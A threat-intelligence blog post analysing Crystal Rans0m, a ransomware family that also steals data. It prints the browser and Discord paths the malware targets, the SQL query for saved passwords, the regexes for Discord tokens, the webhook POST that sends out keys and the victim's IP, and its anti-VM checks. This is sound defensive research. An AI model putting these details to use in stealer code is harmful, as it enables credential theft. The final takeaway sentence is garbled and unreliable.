					<h1 class="entry-title">Crystal Rans0m: Emerging hybrid ransomware with stealer capabilities</h1>					<div class="post-info">
						<span class="post-category">
							<a href="https://outpost24.com/blog/category/research-and-threat-intel/">Research &amp; Threat Intel</a>							</span>
							<span class="post-date">12 Sep 2024</span>
						</div>
					</div>
											<div class="article-author">
							<span class="written-by">Written By</span>
																							<div class="author-container">
									<span class="author-name"><a href="https://outpost24.com/blog/authors/lidia-lopez-sanz-2/">Lidia López Sanz</a></span>
									<span class="author-title">Strategic Research Team Lead</span>
								</div>
																							<div class="author-container">
									<span class="author-name"><a href="https://outpost24.com/blog/authors/krakenlabs/">KrakenLabs</a></span>
									<span class="author-title">Threat Intelligence Team, Outpost24</span>
								</div>
													</div>
										
<p><strong>Crystal Rans0m</strong> is a previously undocumented hybrid ransomware family developed in Rust programming language seen for the first time in the wild on September 2<sup>nd</sup>, 2023. Interestingly, it does not only encrypt victim&#8217;s files, demanding a ransom for their release, but also steals sensitive information from the infected systems.</p>



<p>This dual-threat approach means that attackers can double their leverage over victims, potentially increasing their chances of monetizing their attacks. Therefore, it can be categorized as a <strong>Stealer-as-a-Ransomware</strong> malware, a term coined by Zscaler researchers in a <a href="https://www.zscaler.es/blogs/security-research/ransomware-redefined-redenergy-stealer-ransomware-attacks">publication about RedEnergy</a>.</p>



<p>Regarding attribution, Crystal Rans0m doesn’t share similarities to any other malware family, and it hasn’t been attributed to any known threat actor. In this post, we’ll analyze the technical capabilities of <strong>Crystal Rans0m</strong>, describing in detail both its hybrid ransomware and stealer components.</p>



<h2 class="wp-block-heading" id="h-emergent-threat-hybrid-ransomware"><span class="ez-toc-section" id="emergent-threat-hybrid-ransomware"></span>Emergent threat: Hybrid ransomware<span class="ez-toc-section-end"></span></h2>



<p>Since <strong>double-extortion </strong>became prevalent with the most notable ransomware groups publishing <strong>confidential information </strong>from victims into a Data Leak Site (DLS), there have been multiple publications reporting the use of attack chains with different stages, that involve both an information stealer and a final ransomware payload.</p>



<p>By combining hybrid ransomware and stealer capabilities, attackers maximize the efficacy of their campaigns. Even if the ransom is not paid, the stolen data can be sold or used for further attacks, such as identity theft or spear phishing. It’s very uncommon to observe both types of malware categories in a single executable file. However, this is the case of <strong>Crystal Rans0m, </strong>RedEnergy, and <a href="https://www.zscaler.es/blogs/security-research/ftcode-ransomware--new-version-includes-stealing-capabilities">FTCODE</a>.</p>



<p>Currently, ransomware groups seem to prefer to separate data exfiltration activities from encryption activities, but it’s important to pay attention to this emerging threat and how hybrid ransomware groups innovate on their TTPs. Another documented case of <strong>hybrid ransomware</strong> is <a href="https://www.botconf.eu/botconf-presentation-or-article/rat-as-a-ransomware-an-hybrid-approach/">RAT-as-a-Ransomware</a>, in the case of VenomRAT and Anarchy Panel RAT, embedding a ransomware component.</p>



<h2 class="wp-block-heading" id="h-technical-analysis"><span class="ez-toc-section" id="technical-analysis"></span>Technical analysis<span class="ez-toc-section-end"></span></h2>



<p>This section will focus on a sample with sha256 15219aa22db99f064c47c224a205cdd3ed438dabd2d2593242ed2882e6458311, which was the latest found at the time of the analysis. The technical analysis will include first an overview of the initial actions carried out by the malware, followed up by its main characteristics as a stealer and a ransomware. Finally, as Outpost24’s KrakenLabs team detected a new sample before publishing this blogpost, a final section contains the peculiarities of a newer sample from August 2024.</p>



<h3 class="wp-block-heading" id="h-key-functionalities"><span class="ez-toc-section" id="key-functionalities"></span>Key functionalities<span class="ez-toc-section-end"></span></h3>



<ul class="wp-block-list">
<li>Encrypts victim&#8217;s data to leverage for ransom demands</li>



<li>Requests ransom payment in Monero, enhancing anonymity</li>



<li>As a stealer, it’s mainly focused on browsers, but it also targets Steam, Discord, and Riot Games clients</li>



<li>Uses Discord webhooks for command and control operations</li>
</ul>



<h3 class="wp-block-heading" id="h-initial-actions"><span class="ez-toc-section" id="initial-actions"></span>Initial actions<span class="ez-toc-section-end"></span></h3>



<p>Prior to any stealing or ransomware operations, <strong>Crystal </strong>loads its configuration:</p>



<h4 class="wp-block-heading" id="h-decrypting-the-discord-webhook-used-for-exfiltration">Decrypting the Discord Webhook used for exfiltration</h4>



<p>Crystal uses a Discord Webhook for exfiltrating both stolen data and the key and nonce used for encryption. This webhook is hardcoded but it’s encrypted and encoded. So, among its initial configuration it proceeds to decrypt it, using an also hardcoded key (also used to decrypt part of the ransom note), and simple XOR and array operations, then decodes it using base 64.</p>



<h4 class="wp-block-heading" id="h-generating-paths-for-targeted-software">Generating paths for targeted software</h4>



<p>As part of its configuration, it also generates the paths for the data directories of targeted data (under <span class="code">“%localappdata%”</span> or <span class="code">&#8220;%appdata%”</span>). For the browsers, it generates two separate sets:</p>



<pre class="wp-block-code"><code>C:\Users\MyPC\AppData\Roaming\Opera Software\Opera Stable
C:\Users\MyPC\AppData\Roaming\Opera Software\Opera GX Stable
C:\Users\MyPC\AppData\Local\Amigo\User Data
C:\Users\MyPC\AppData\Local\Torch\User Data
C:\Users\MyPC\AppData\Local\Kometa\User Data
C:\Users\MyPC\AppData\Local\Orbitum\User Data
C:\Users\MyPC\AppData\Local\CentBrowser\User Data
C:\Users\MyPC\AppData\Local\7Star\7Star\User Data
C:\Users\MyPC\AppData\Local\Spfutnik\Sputnik\User Data
C:\Users\MyPC\AppData\Local\Google\Chrome SxS\User Data</code></pre>



<pre class="wp-block-code"><code>C:\Users\MyPC\AppData\Local\Vivaldi\User Data
C:\Users\MyPC\AppData\Local\Microsoft\Edge\User Data
C:\Users\MyPC\AppData\Local\Yandex\YandexBrowser\User Data
C:\Users\MyPC\AppData\Local\Iridium\User Data
C:\Users\MyPC\AppData\Local\uCozMedia\Uran\User Data
C:\Users\MyPC\AppData\Local\BraveSoftware\Brave-Browser\User Data
C:\Users\MyPC\AppData\Local\Google\Chrome\User Data</code></pre>



<p>It also generates paths for standard Discord, Discord Canary, and Discord PTB.</p>



<h3 class="wp-block-heading" id="h-infostealer-component"><span class="ez-toc-section" id="infostealer-component"></span>Infostealer component<span class="ez-toc-section-end"></span></h3>



<h4 class="wp-block-heading" id="h-malware-working-directory">Malware working directory</h4>



<p>When grabbing a directory, a file or parsing the content of a file, Crystal will first create a new custom malware working folder under <span class="code">&#8220;%Temp%\wintemp.&lt;random&gt;\&#8221;</span>. Then, the targeted file will be copied to the malware working folder, read, and deleted when it is no longer necessary.</p>



<p>The deletion process does not use <span class="code">DeleteFileA/W</span> APIs. To perform the file deletion, Crystal first opens the file with <span class="code">FILE_FLAG_DELETE_ON_CLOSE</span> flag, which will cause the file deletion once all its handles are closed. Then, it renames the file and moves it to <span class="code">“%Temp%”</span> directory using <span class="code">SetFileInformationByHandle</span> API, with <span class="code">FileRenameInfo</span> as <span class="code">FileInformationClass</span> parameter, and <span class="code">“\\?\%Temp%\rm-&lt;counter&gt;”</span> as the new path.</p>



<p>This behavior is not specific to this malware family, but to the<strong> Rust library</strong> used to perform the deletion (<span class="code"><a href="https://docs.rs/crate/remove_dir_all/0.5.3/source/src/fs.rs">remove_dir_alllibrary</a></span>).</p>



<h4 class="wp-block-heading" id="h-stealing-browser-information">Stealing browser information</h4>



<h5 class="wp-block-heading" id="h-getting-the-browser-s-masterkey">Getting the browser’s masterkey</h5>



<p>In order to steal the masterkey, Crystal iterates browser paths and checks if they are present in the host. If so, it will try to locate their <span class="code">Local State</span> file to extract the browser&#8217;s master key.</p>



<p>Crystal creates a temporary malware working folder under <span class="code">&#8220;%Temp%\wintemp.&lt;random&gt;\&#8221;</span> and tries to copy <span class="code">&#8220;\&lt;browser path&gt;\User Data\Local State&#8221;</span> file inside the MW working folder.</p>



<p>If successful, it will read its content and try to locate <span class="code">“os_crypt”</span> key and <span class="code">“encrypted_key”</span> key inside of it. Next, it will decode the retrieved value, which is encoded in base64, remove the &#8220;DPAPI&#8221; suffix and call <span class="code">CryptUnprotectData</span> API to obtain the master key.</p>



<h5 class="wp-block-heading" id="h-collecting-browser-information">Collecting browser information</h5>



<p>Once the masterkey is successfully obtained, Crystal will then iterate the files inside the browser&#8217;s <span class="code">&#8220;\User Data&#8221;</span> directory in order to locate the <span class="code">“\Default”</span> folder.</p>



<p>The following table shows the targeted SQLite DDBB, along with the SQL queries used to collect the information from them. Again, if found, the targeted files would be copied inside a malware working folder and read from there.</p>



<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th>
                    <p>File</p>
                </th><th>
                    <p>SQL Queries</p>
                </th></tr></thead><tbody><tr><td>
                    <p>&lt;Browser path&gt;\User Data\Default\Login Data</p>
                </td><td>
                    <p><span class="code">SELECT origin_url, username_value, password_value FROM logins</span></p>
                </td></tr><tr><td>
                    <p>&lt;Browser path&gt;\User Data\Default\History</p>
                </td><td>

                </td></tr><tr><td>
                    <p>&lt;Browser path&gt;\User Data\Default\Cookies</p>
                    <p>&lt;Browser path&gt;\User Data\Default\Network\Cookies</p>

                </td></tr></tbody></table></figure>



<p>When the cookies information is retrieved, the <span class="code">“encrypted_value”</span> will be decrypted using AES with the previously obtained masterkey.</p>



<h4 class="wp-block-heading" id="h-stealing-discord-information">Stealing Discord information</h4>



<p>The stealer targets Discord user&#8217;s data in two ways:</p>



<ol class="wp-block-list">
<li>From browsers</li>



<li>From the Discord desktop application</li>
</ol>



<h5 class="wp-block-heading" id="h-getting-discord-user-tokens-from-browsers">Getting Discord user tokens from browsers</h5>



<p>After getting the masterkey and calling the browser&#8217;s stealing function, it will try to locate <span class="code">&#8220;\Local Storage\leveldb&#8221;</span> path inside the browser&#8217;s Default path. If found, it will iterate it, trying to locate <span class="code">“.log”</span> or <span class="code">“.ldb”</span> files. If any of them are found, it will search for Discord user tokens on their content, using the following regex:</p>



<pre class="wp-block-code"><code>&#091;\w-]{24}\.&#091;\w-]{6}\.&#091;\w-]{25,110}</code></pre>



<h5 class="wp-block-heading" id="h-from-discord-local-client">From Discord local client</h5>



<p>The stealer tries to locate Discord paths and, if any are found, it tries to extract the masterkey with an equivalent approach to the one used for browsers. Then, it tries to locate any <span class="code">&#8220;.log&#8221;</span> or <span class="code">&#8220;.lbd&#8221;</span> files inside <span class="code">&#8220;leveldb&#8221;</span> subpaths.</p>



<p>In this case, it will try to locate encrypted tokens using the following regex:</p>



<pre class="wp-block-code"><code>dQw4w9WgXcQ:&#091;^\"]*</code></pre>



<p>The retrieved token is encoded in base64, so it will first be decoded and then decrypted using AES with the retrieved masterkey.</p>



<h4 class="wp-block-heading" id="h-final-steps-and-data-exfiltration">Final steps and data exfiltration</h4>



<h5 class="wp-block-heading" id="h-getting-the-victim-s-ip">Getting the victim&#8217;s IP</h5>



<p>Prior to exfiltrating the information, Crystal will try to obtain the victim&#8217;s IP from <span class="code">“hxxp://ifconfig[.] me”</span>. This IP will most likely be used as an identifier for the victim as will be shown in a later section (in the “Exfiltrating the key” subsection). The structure of the request is equivalent for both requests. Nevertheless, in this first contact, the &#8220;Nonce&#8221; and &#8220;Key&#8221; are not sent as they have not yet been generated (the value field is filled with an underscore).</p>



<h5 class="wp-block-heading" id="h-grabbing-steam-files">Grabbing Steam files</h5>



<p>If Steam is installed in the host (which is checked by searching for directory <span class="code">&#8220;C:\Program Files (x<a id="_Int_dWAQ1d0O"></a>86)\Steam&#8221;</span>), it will try to grab <span class="code">&#8220;loginusers.vdf&#8221;</span> and <span class="code">&#8220;ssfn&#8221;</span> files.</p>



<p>First, it will try to locate its <span class="code">&#8220;Config&#8221;</span> subdirectory, and the <span class="code">&#8220;loginusers.vdf&#8221;</span> file inside of it. Then, it iterates the Steam directory trying to locate <span class="code">&#8220;ssfn&#8221;</span> files (Steam Sentry File), which is used to store Steam credentials.</p>



<h5 class="wp-block-heading" id="h-grabbing-riot-games-files">Grabbing Riot Games files</h5>



<p>The stealer will try to locate <span class="code">&#8220;%LocalAppData%\Riot Games\Riot Client\Data&#8221;</span> directory and, if found, it will grab all files it contains (including subdirectories).</p>



<h5 class="wp-block-heading" id="h-exfiltrating-information">Exfiltrating information</h5>

<p>See below an example of this data for exfiltrating the collected browser passwords:</p>



<pre class="wp-block-code"><code>Content-Disposition: form-data; name="passwds"; filename="passwords.txt"</code></pre>

<h3 class="wp-block-heading" id="h-hybrid-ransomware-component"><span class="ez-toc-section" id="hybrid-ransomware-component"></span>Hybrid Ransomware component<span class="ez-toc-section-end"></span></h3>



<p>As a hybrid ransomware, it iterates the system folders, searching for files to be encrypted. Apart from excluding Windows system folders, it contains a hardcoded set of directories to be excluded from encryption:</p>



<pre class="wp-block-code"><code>AppData <br>ProgramData <br>Program Files <br>Program File(x86) <br>Local Settings\\Temp</code></pre>



<p><strong>Crystal Rans0m</strong> uses SALSA20 for encryption, which is a stream cipher with symmetric encryption and uses a 64-bit keystream.</p>



<p>It works by generating a continuous keystream of pseudo-random bits, which acts as a key, which is xored with the plaintext to be encrypted.</p>



<h4 class="wp-block-heading" id="h-generating-the-key">Generating the key</h4>



<p>A random seed of 32 bytes is generated using <span class="code">BCryptGetRandom API</span> during the first stages of execution. <span class="code">BCRYPT_USE_SYSTEM_PREFERRED_RNG</span> flag is set as, which implies the use of &#8220;the system-preferred random number generator algorithm&#8221;.</p>



<p>Two pseudo-random values will be generated: a 32-byte key and an 8-byte nonce. These two values, along with four 4-byte hardcoded strings and an 8-byte counter will be used to generate an initial 64-byte internal state.</p>


<div class="wp-block-image wp-block-image size-full">
<figure class="aligncenter is-resized"><img decoding="async" width="410" height="250" src="//outpost24.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-lazy-type="image" data-src="https://outpost24.com/wp-content/uploads/2024/09/image1.png" alt="" class="lazy lazy-hidden wp-image-6613" style="width:560px" srcset="" data-srcset="https://outpost24.com/wp-content/uploads/2024/09/image1.png 410w, https://outpost24.com/wp-content/uploads/2024/09/image1-300x183.png 300w" sizes="(max-width: 410px) 100vw, 410px" /><noscript><img decoding="async" width="410" height="250" src="https://outpost24.com/wp-content/uploads/2024/09/image1.png" alt="" class="wp-image-6613" style="width:560px" srcset="https://outpost24.com/wp-content/uploads/2024/09/image1.png 410w, https://outpost24.com/wp-content/uploads/2024/09/image1-300x183.png 300w" sizes="(max-width: 410px) 100vw, 410px" /></noscript><figcaption class="wp-element-caption">Figure 1. <p>This process is executed for each file to encrypt, resulting in the same initial matrix.</p>

<h4 class="wp-block-heading" id="h-file-encryption">File encryption</h4>



<p>The encryption process starts by reading the file content. Then, each byte will be xored with the corresponding keystream byte. Finally, the encrypted content will be encoded in base64.</p>



<p>The hybrid ransomware does not modify the extension of the encrypted files.</p>



<h4 class="wp-block-heading" id="h-exfiltrating-the-key">Exfiltrating the key</h4>



<p>Both the 32-byte key and 8-byte nonce are exfiltrated via the Discord webhook, using a POST request.</p>



<p>The communication between the malware and Discord is encrypted via SSL protocol. In order to do so, Crystal uses <span class="code">EncryptMessage</span> API.</p>



<p>The following parameters and content of the request, prior encryption can be observed:</p>



<pre class="wp-block-code"><code>POST /api/webhooks/&lt;webhook&gt;

HTTP/1.1
content-type: application/json
content-length: &lt;size&gt;
accept: */*
host: discord.com

{\"content\": \"```IP: &lt;victim’s IP&gt;\\nKey: &lt;32B generated Key&gt;\\nNonce: &lt;8B Nonce&gt;```\"}</code></pre>



<h4 class="wp-block-heading" id="h-ransom-note">Ransom note</h4>



<p>The ransom note is written in <span class="code">&#8220;%Temp%\gui.hta&#8221;</span> and shown using <span class="code">mshta.exe</span> (component that provides the Microsoft HTML Application Host, which allows execution of .HTA (HTML Application) files). The main content of the ransom note is hardcoded in plain text. The rest of the information (HTML-formatted) is encrypted with XOR (using <span class="code">“0x9”</span> as key in the analyzed sample) and encoded in base64.</p>



<p>It creates a batch file in the startup folder, responsible for reloading the ransom note in each restart.</p>



<h2 class="wp-block-heading" id="h-newer-version"><span class="ez-toc-section" id="newer-version"></span>Newer version<span class="ez-toc-section-end"></span></h2>



<p>When we were about to publish this blog post, we found a new sample (sha256 bed70b08cf8b00b4e6b04acd348b5e0343d207f3083e1c58261679706bd10318) from 6th August 2024. This section will summarize the main aspects of this new sample in comparison to the one analyzed in the previous sections, and the older ones.</p>



<p>The main aspect to highlight is that we did not observe hybrid ransomware behavior in this new sample. This change is reflected in the code in several ways, the main ones being: no salsa20 algorithm code is observed; the Rust libraries related to this feature have been removed; the requests no longer contain the &#8220;Key&#8221; and &#8220;Nonce&#8221; fields, now it only sends the victim&#8217;s IP; and no references either to &#8220;mshta.exe&#8221; or the ransom note filename (&#8220;gui.hta&#8221;).</p>



<p>This new sample leads us to the hypothesis that Crystal is a modular solution, which allows the attacker to choose the modules to deploy for each attack.</p>



<p>Another change is that this new sample contains a new Discord webhook, which is hardcoded in plain text, as opposed to the previous encrypted version.</p>



<p>Another relevant aspect to highlight is that this sample applies several techniques to avoid emulation and debugging. Most of them were observed in older versions, not being present in the sample analyzed in previous sections. This new sample incorporates a new one based on registry checks.</p>



<h3 class="wp-block-heading" id="h-anti-vm-techniques"><span class="ez-toc-section" id="anti-vm-techniques"></span>Anti-VM techniques<span class="ez-toc-section-end"></span></h3>



<ul class="wp-block-list">
<li>It checks if a hardcoded set of registry keys associated with VM software are present on the infected host using <span class="code">RegOpenKeyExW</span> API. If any key is found, it will abort its execution. The list of queried registry keys can be found in Annex 2.</li>



<li>The stealer searches for processes associated with VM software in the running processes. The searched processes are:</li>
</ul>



<pre class="wp-block-code"><code>Vmtoolsd.exe<br>Vmwaretrat.exe<br>Vmwareuser.exe<br>vm_process.exe<br>VmRemoteGuest.exe</code></pre>



<ul class="wp-block-list">
<li>Finally, it checks if any of the following drivers associated with VM software is present in the host, using <span class="code">CreateFileW</span> API:</li>
</ul>



<pre class="wp-block-code"><code>C:\windows\System32\Drivers\Vmmouse.sys<br>C:\windows\System32\Drivers\vm3dgl.dll<br>C:\windows\System32\vmdum.dll<br>C:\windows\System32\Drivers\VBoxGuest.sys</code></pre>



<ul class="wp-block-list">
<li>It also contains a time-based check to hinder the debugging process. In order to do so, it executes <span class="code">GetLocalTime</span> and <span class="code">SystemTimeToFileTime</span> APIs two times, subtracting the results and checking if the difference is higher than 1,000. If so, it will end its execution</li>



<li>Again, it will iterate the running processes, this time comparing them against a list containing both processes associated with VMs and with analysis tools. Annex 2 also contains the list of processes searched in this check.</li>
</ul>



<h2 class="wp-block-heading" id="h-attribution"><span class="ez-toc-section" id="attribution"></span>Attribution<span class="ez-toc-section-end"></span></h2>



<p>The ransom note includes some information that could serve as a starting point to attribute Crystal Rans0m activity to a threat actor. The ransom note observed in the analyzed samples contain a Monero wallet address, Session id, and Discord exfiltration webhook. These indicators have not been observed in any other campaigns or malware samples; therefore, we have not been able to attribute the Crystal Rans0m to any publicly known threat actor.</p>



<p>Something else that caught our attention is the use of the <strong>Session instant messaging application </strong>(getsession[.]org) as a communication method between the ransomware operator and the victim for negotiation. As of August 2024, it is highly unusual to see ransomware groups using Session, as we have only located dozens of ransom notes with a unique Session id, including, for instance, SEXi ransomware. The most frequently observed contact methods for ransomware negotiations are email, Jabber, and Tox.</p>

<h2 class="wp-block-heading" id="h-key-takeaways"><span class="ez-toc-section" id="key-takeaways"></span>Key takeaways<span class="ez-toc-section-end"></span></h2>



<p>Crystal Rans0m is a rather simple low-prevalence malware, that, however, has some distinct characteristics worthy of attention. Its combination of info-stealing and file encryption capabilities puts this malware family in the rare category of Stealer-as-Ransomware. Crystal Rans0m exemplifies the dangerous potential of this hybrid threat, emphasizing the need for advanced security measures and comprehensive incident response strategies, that&#8217;s how you can approach and remove hbrid reansom</p>



<p>Organizations must stay vigilant and proactive to protect themselves from these dual threats that aim to steal sensitive data and encrypt files at the same time. Outpost24 KrakenLabs’ analysts will continue to monitor the state of hybrid ransomware and analyze its potential to become a trend within the ransomware landscape.</p>
